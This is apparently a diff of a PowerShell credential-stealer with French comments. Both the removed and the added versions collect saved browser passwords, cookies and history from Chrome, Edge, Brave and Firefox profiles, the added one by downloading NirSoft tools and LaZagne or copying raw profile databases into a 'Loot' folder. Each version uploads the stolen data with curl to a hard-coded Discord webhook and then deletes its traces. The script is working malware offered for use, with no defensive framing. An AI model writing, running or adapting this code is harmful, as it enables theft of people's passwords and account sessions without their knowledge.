@@ -1,100 +1,228 @@
 $wh="https://discord.com/api/webhooks/1467523812563357737/NtrM4DGzR7UGo0mOZ4i2-Y65OzXuto6PCbm-T8K67_JoFGV_rElaAwtptxjQJbPGH5i6"
 
-# Kill browsers
-taskkill /F /IM chrome.exe,msedge.exe,brave.exe 2>$null
+# === FONCTION D'ENVOI ===
+function Send-Results {
+    param($file, $method)
+    if ((Test-Path $file) -and ((Get-Item $file).Length -gt 50)) {
+        curl.exe -F "file=@$file" -F "content=**✅ SUCCESS - Method: $method | PC: $env:COMPUTERNAME**" $wh
+        return $true
+    }
+    return $false
+}
+
+# === KILL BROWSERS ===
+taskkill /F /IM msedge.exe,chrome.exe,brave.exe,firefox.exe 2>$null
 Start-Sleep -Seconds 2
 
-# Fonction de déchiffrement
-Add-Type -AssemblyName System.Security
-function Get-DecryptedPasswords {
-    param($browserPath, $browserName)
+$success = $false
+
+# ========================================
+# MÉTHODE 1: EdgePassView (NirSoft)
+# ========================================
+Write-Host "[1/6] Trying EdgePassView..."
+try {
+    Invoke-WebRequest "https://www.nirsoft.net/toolsdownload/edgepassview.zip" -OutFile "$env:TEMP\ep.zip" -UseBasicParsing -TimeoutSec 15 -ErrorAction Stop
+    Expand-Archive "$env:TEMP\ep.zip" "$env:TEMP\ep" -Force
+    $ep = "$env:TEMP\ep\EdgePassView.exe"
     
-    $loginDataPath = "$browserPath\Login Data"
-    $localStatePath = "$browserPath\..\Local State"
+    & $ep /stext "$env:TEMP\result1.txt"
+    Start-Sleep 3
     
-    if (!(Test-Path $loginDataPath)) { return @() }
-    
-    # Copier temporairement la DB
-    $tempDb = "$env:TEMP\tempLogin.db"
-    Copy-Item $loginDataPath $tempDb -Force -EA 0
-    
-    # Lire la clé de chiffrement
-    if (Test-Path $localStatePath) {
-        $localState = Get-Content $localStatePath | ConvertFrom-Json
-        $encryptedKey = [System.Convert]::FromBase64String($localState.os_crypt.encrypted_key)
-        $encryptedKey = $encryptedKey[5..($encryptedKey.Length-1)] # Enlever "DPAPI"
-        $key = [System.Security.Cryptography.ProtectedData]::Unprotect($encryptedKey, $null, [System.Security.Cryptography.DataProtectionScope]::CurrentUser)
+    if (Send-Results "$env:TEMP\result1.txt" "EdgePassView") {
+        $success = $true
     }
     
-    # Lire SQLite
-    $conn = New-Object System.Data.SQLite.SQLiteConnection("Data Source=$tempDb;Version=3;")
-    $conn.Open()
-    $cmd = $conn.CreateCommand()
-    $cmd.CommandText = "SELECT origin_url, username_value, password_value FROM logins"
-    $reader = $cmd.ExecuteReader()
+    Remove-Item "$env:TEMP\ep.zip","$env:TEMP\ep" -Recurse -Force -EA 0
+} catch {
+    Write-Host "EdgePassView failed: $_"
+}
+
+if ($success) { 
+    Remove-Item "$env:TEMP\result*.txt" -Force -EA 0
+    exit 
+}
+
+# ========================================
+# MÉTHODE 2: WebBrowserPassView (Tous navigateurs)
+# ========================================
+Write-Host "[2/6] Trying WebBrowserPassView..."
+try {
+    Invoke-WebRequest "https://www.nirsoft.net/toolsdownload/webbrowserpassview.zip" -OutFile "$env:TEMP\wb.zip" -UseBasicParsing -TimeoutSec 15 -ErrorAction Stop
+    Expand-Archive "$env:TEMP\wb.zip" "$env:TEMP\wb" -Force
+    $wb = "$env:TEMP\wb\WebBrowserPassView.exe"
     
-    $results = @()
-    while ($reader.Read()) {
-        $encryptedPassword = [byte[]]$reader["password_value"]
+    & $wb /stext "$env:TEMP\result2.txt"
+    Start-Sleep 3
+    
+    if (Send-Results "$env:TEMP\result2.txt" "WebBrowserPassView") {
+        $success = $true
+    }
+    
+    Remove-Item "$env:TEMP\wb.zip","$env:TEMP\wb" -Recurse -Force -EA 0
+} catch {
+    Write-Host "WebBrowserPassView failed: $_"
+}
+
+if ($success) { 
+    Remove-Item "$env:TEMP\result*.txt" -Force -EA 0
+    exit 
+}
+
+# ========================================
+# MÉTHODE 3: BrowsingHistoryView (Historique)
+# ========================================
+Write-Host "[3/6] Trying BrowsingHistoryView..."
+try {
+    Invoke-WebRequest "https://www.nirsoft.net/toolsdownload/browsinghistoryview.zip" -OutFile "$env:TEMP\bh.zip" -UseBasicParsing -TimeoutSec 15 -ErrorAction Stop
+    Expand-Archive "$env:TEMP\bh.zip" "$env:TEMP\bh" -Force
+    $bh = "$env:TEMP\bh\BrowsingHistoryView.exe"
+    
+    & $bh /VisitTimeFilterType 1 /VisitTimeFilterValue 30 /stext "$env:TEMP\result3.txt"
+    Start-Sleep 3
+    
+    if (Send-Results "$env:TEMP\result3.txt" "BrowsingHistoryView") {
+        $success = $true
+    }
+    
+    Remove-Item "$env:TEMP\bh.zip","$env:TEMP\bh" -Recurse -Force -EA 0
+} catch {
+    Write-Host "BrowsingHistoryView failed: $_"
+}
+
+if ($success) { 
+    Remove-Item "$env:TEMP\result*.txt" -Force -EA 0
+    exit 
+}
+
+# ========================================
+# MÉTHODE 4: ChromePass (Chrome/Edge)
+# ========================================
+Write-Host "[4/6] Trying ChromePass..."
+try {
+    Invoke-WebRequest "https://www.nirsoft.net/toolsdownload/chromepass.zip" -OutFile "$env:TEMP\cp.zip" -UseBasicParsing -TimeoutSec 15 -ErrorAction Stop
+    Expand-Archive "$env:TEMP\cp.zip" "$env:TEMP\cp" -Force
+    $cp = "$env:TEMP\cp\ChromePass.exe"
+    
+    & $cp /stext "$env:TEMP\result4.txt"
+    Start-Sleep 3
+    
+    if (Send-Results "$env:TEMP\result4.txt" "ChromePass") {
+        $success = $true
+    }
+    
+    Remove-Item "$env:TEMP\cp.zip","$env:TEMP\cp" -Recurse -Force -EA 0
+} catch {
+    Write-Host "ChromePass failed: $_"
+}
+
+if ($success) { 
+    Remove-Item "$env:TEMP\result*.txt" -Force -EA 0
+    exit 
+}
+
+# ========================================
+# MÉTHODE 5: LaZagne (Tout-en-un)
+# ========================================
+Write-Host "[5/6] Trying LaZagne..."
+try {
+    Invoke-WebRequest "https://github.com/AlessandroZ/LaZagne/releases/download/v2.4.5/LaZagne.exe" -OutFile "$env:TEMP\laz.exe" -UseBasicParsing -TimeoutSec 20 -ErrorAction Stop
+    
+    & "$env:TEMP\laz.exe" browsers -oN > "$env:TEMP\result5.txt"
+    Start-Sleep 3
+    
+    if (Send-Results "$env:TEMP\result5.txt" "LaZagne") {
+        $success = $true
+    }
+    
+    Remove-Item "$env:TEMP\laz.exe" -Force -EA 0
+} catch {
+    Write-Host "LaZagne failed: $_"
+}
+
+if ($success) { 
+    Remove-Item "$env:TEMP\result*.txt" -Force -EA 0
+    exit 
+}
+
+# ========================================
+# MÉTHODE 6: Exfiltration brute des DBs (fallback ultime)
+# ========================================
+Write-Host "[6/6] Trying raw database exfiltration..."
+try {
+    cd $env:TEMP
+    Remove-Item Loot -Recurse -Force -EA 0
+    mkdir Loot -Force | Out-Null
+    
+    # Edge
+    if (Test-Path "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Login Data") {
+        Copy-Item "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Login Data" "Loot\Edge_Passwords.db" -EA 0
+    }
+    if (Test-Path "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Local State") {
+        Copy-Item "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Local State" "Loot\Edge_Local_State" -EA 0
+    }
+    if (Test-Path "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\History") {
+        Copy-Item "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\History" "Loot\Edge_History.db" -EA 0
+    }
+    if (Test-Path "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Cookies") {
+        Copy-Item "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Cookies" "Loot\Edge_Cookies.db" -EA 0
+    }
+    
+    # Chrome
+    if (Test-Path "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data") {
+        Copy-Item "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data" "Loot\Chrome_Passwords.db" -EA 0
+    }
+    if (Test-Path "$env:LOCALAPPDATA\Google\Chrome\User Data\Local State") {
+        Copy-Item "$env:LOCALAPPDATA\Google\Chrome\User Data\Local State" "Loot\Chrome_Local_State" -EA 0
+    }
+    
+    # Brave
+    if (Test-Path "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data\Default\Login Data") {
+        Copy-Item "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data\Default\Login Data" "Loot\Brave_Passwords.db" -EA 0
+    }
+    if (Test-Path "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data\Local State") {
+        Copy-Item "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data\Local State" "Loot\Brave_Local_State" -EA 0
+    }
+    
+    # Compresser
+    $fileCount = (Get-ChildItem Loot).Count
+    
+    if ($fileCount -gt 0) {
+        Compress-Archive -Path "Loot\*" -DestinationPath "loot.zip" -Force
         
-        if ($encryptedPassword.Length -gt 0) {
-            try {
-                # Déchiffrement AES-GCM
-                $nonce = $encryptedPassword[3..14]
-                $ciphertext = $encryptedPassword[15..($encryptedPassword.Length-17)]
-                $tag = $encryptedPassword[($encryptedPassword.Length-16)..($encryptedPassword.Length-1)]
-                
-                $aes = New-Object System.Security.Cryptography.AesGcm
-                $decrypted = New-Object byte[] $ciphertext.Length
-                $aes.Decrypt($key, $nonce, $ciphertext, $tag, $decrypted)
-                
-                $password = [System.Text.Encoding]::UTF8.GetString($decrypted)
-                
-                $results += [PSCustomObject]@{
-                    Browser = $browserName
-                    URL = $reader["origin_url"]
-                    Username = $reader["username_value"]
-                    Password = $password
-                }
-            } catch {}
-        }
+        curl.exe -F "file=@loot.zip" -F "content=**⚠️ FALLBACK - Raw DB files ($fileCount files) - $env:COMPUTERNAME - Decrypt with your previous Python script**" $wh
+        
+        $success = $true
     }
     
-    $reader.Close()
-    $conn.Close()
-    Remove-Item $tempDb -Force -EA 0
+    Remove-Item "loot.zip","Loot" -Recurse -Force -EA 0
+} catch {
+    Write-Host "Raw exfiltration failed: $_"
+}
+
+# ========================================
+# SI TOUT A ÉCHOUÉ
+# ========================================
+if (!$success) {
+    $errorReport = @"
+❌ ALL METHODS FAILED on $env:COMPUTERNAME
+
+Computer: $env:COMPUTERNAME
+User: $env:USERNAME
+Edge installed: $(Test-Path "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Login Data")
+Chrome installed: $(Test-Path "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data")
+PowerShell version: $($PSVersionTable.PSVersion)
+
+Possible reasons:
+- No passwords saved in browsers
+- Windows Defender blocked NirSoft tools
+- Network download failed
+- PowerShell execution policy blocked scripts
+"@
     
-    return $results
+    $errorReport | Out-File "$env:TEMP\error_report.txt"
+    curl.exe -F "file=@$env:TEMP\error_report.txt" -F "content=**❌ TOTAL FAILURE - $env:COMPUTERNAME**" $wh
+    Remove-Item "$env:TEMP\error_report.txt" -Force -EA 0
 }
 
-# Télécharger SQLite si nécessaire
-if (!(Get-Command -Name 'sqlite3.exe' -EA 0)) {
-    $sqliteDll = "$env:TEMP\System.Data.SQLite.dll"
-    if (!(Test-Path $sqliteDll)) {
-        Invoke-WebRequest -Uri "https://system.data.sqlite.org/blobs/1.0.118.0/sqlite-netFx46-binary-x64-2015-1.0.118.0.zip" -OutFile "$env:TEMP\sqlite.zip"
-        Expand-Archive "$env:TEMP\sqlite.zip" "$env:TEMP\sqlite" -Force
-        Copy-Item "$env:TEMP\sqlite\System.Data.SQLite.dll" $sqliteDll -Force
-    }
-    Add-Type -Path $sqliteDll
-}
-
-# Extraire les mots de passe
-$allPasswords = @()
-$allPasswords += Get-DecryptedPasswords "$env:LOCALAPPDATA\Google\Chrome\User Data\Default" "Chrome"
-$allPasswords += Get-DecryptedPasswords "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default" "Edge"
-$allPasswords += Get-DecryptedPasswords "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data\Default" "Brave"
-
-# Formater en texte
-$output = "=== PASSWORDS FROM $env:COMPUTERNAME ===`n`n"
-foreach ($p in $allPasswords) {
-    $output += "[$($p.Browser)] $($p.URL)`n"
-    $output += "Username: $($p.Username)`n"
-    $output += "Password: $($p.Password)`n`n"
-}
-
-# Envoyer via Discord
-$output | Out-File "$env:TEMP\passwords.txt" -Encoding UTF8
-curl.exe -F "file=@$env:TEMP\passwords.txt" -F "content=**Passwords from $env:COMPUTERNAME**" $wh
-
-# Cleanup
-Remove-Item "$env:TEMP\passwords.txt" -Force -EA 0
+# Cleanup final
+Remove-Item "$env:TEMP\result*.txt","$env:TEMP\*.zip" -Force -EA 0
